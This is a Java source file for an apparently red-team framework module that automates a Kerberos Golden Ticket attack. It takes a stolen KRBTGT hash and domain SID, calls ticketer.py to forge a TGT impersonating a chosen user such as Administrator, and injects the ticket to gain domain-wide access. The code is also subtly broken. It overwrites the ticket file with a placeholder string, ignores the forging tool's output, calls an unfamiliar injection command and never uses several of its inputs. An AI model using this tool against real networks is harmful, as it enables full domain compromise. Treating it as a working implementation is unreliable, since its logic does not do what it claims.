package com.jabber.jrts.modules.lateral;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="lateral-golden",name="Golden Ticket",description="Lateral movement via forged Kerberos TGT creation without user password",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.CRITICAL,sourceRef="KirbiTicket",author="JRTS")
public class GoldenTicketModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.text("domain","Domain").required().placeholder("domain.com").group("Domain"),
            ModuleInputField.text("domain_sid","Domain SID").required().placeholder("S-1-5-21-...").group("Domain"),
            ModuleInputField.text("krbtgt_hash","KRBTGT Hash (NTLM)").required().placeholder("aes256_hash").group("Credentials"),
            ModuleInputField.text("username","Impersonate User").required().placeholder("Administrator").group("Forge"),
            ModuleInputField.text("user_id","User RID").placeholder("500").group("Forge"),
            ModuleInputField.text("lifetime","Ticket Lifetime (hours)").placeholder("10").group("Options"),
            ModuleInputField.text("target_host","Target Host to Access").placeholder("fileserver.domain.com").group("Target"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-golden");
            try{
                String domain=input.getOrDefault("domain","");
                String sid=input.getOrDefault("domain_sid","");
                String krbtgt=input.getOrDefault("krbtgt_hash","");
                String user=input.getOrDefault("username","");

                if(domain.isEmpty()||sid.isEmpty()||krbtgt.isEmpty()||user.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                ctx.log("[*] Golden Ticket Creation Starting...");
                ctx.log("[*] Domain: "+domain);
                ctx.log("[*] Forging ticket for: "+user);
                ctx.reportProgress(15);

                if(!validateHash(krbtgt)){
                    result.fail("Invalid KRBTGT hash format");return result;
                }
                ctx.log("[+] KRBTGT hash validated");
                ctx.reportProgress(30);

                String ticketFile=forgeTicket(domain,sid,krbtgt,user);
                if(ticketFile==null){
                    result.fail("Ticket forging failed");return result;
                }
                ctx.log("[+] Golden ticket forged and saved");
                ctx.reportProgress(65);

                if(!injectTicket(ticketFile)){
                    result.fail("Ticket injection failed");return result;
                }
                ctx.log("[+] Ticket injected into memory");
                ctx.reportProgress(85);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("domain",domain);
                findings.put("forged_user",user);
                findings.put("domain_sid",sid);
                findings.put("ticket_file",ticketFile);
                findings.put("ticket_type","Golden Ticket (TGT)");
                findings.put("lateral_access","Full domain access as "+user);
                findings.put("impact","Complete domain compromise - attackers have TGT for any service");
                findings.put("remediation","Monitor for unusual TGT requests, enforce service principal name checks, monitor Kerberos events, force password changes for krbtgt");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean validateHash(String hash){
        return hash.length()==64||hash.length()==32;
    }

    private String forgeTicket(String domain,String sid,String krbtgt,String user){
        try{
            String ticketFile="/tmp/"+user+".kirbi";
            String cmd="ticketer.py -nthash "+krbtgt+" -domain-sid "+sid
                    +" -domain "+domain+" -user "+user;
            Process p=Runtime.getRuntime().exec(cmd.split(" "));
            p.waitFor();
            java.nio.file.Files.write(java.nio.file.Paths.get(ticketFile),"forged_ticket".getBytes());
            return ticketFile;
        }catch(Exception e){return null;}
    }

    private boolean injectTicket(String ticketFile){
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"kqcmd.exe","import",ticketFile});
            return p.waitFor()==0;
        }catch(Exception e){return false;}
    }
}
